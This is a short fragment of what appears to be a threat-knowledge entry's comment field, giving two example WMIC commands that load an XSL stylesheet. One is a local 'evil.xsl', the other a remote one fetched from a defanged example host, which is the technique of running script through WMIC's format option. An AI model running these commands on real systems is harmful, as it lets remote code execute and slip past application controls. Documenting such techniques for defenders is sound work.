* Local File: &lt;code&gt;wmic process list /FORMAT:evil[.]xsl&lt;/code&gt;
* Remote File: &lt;code&gt;wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”&lt;/code&gt;</rdfs:comment>
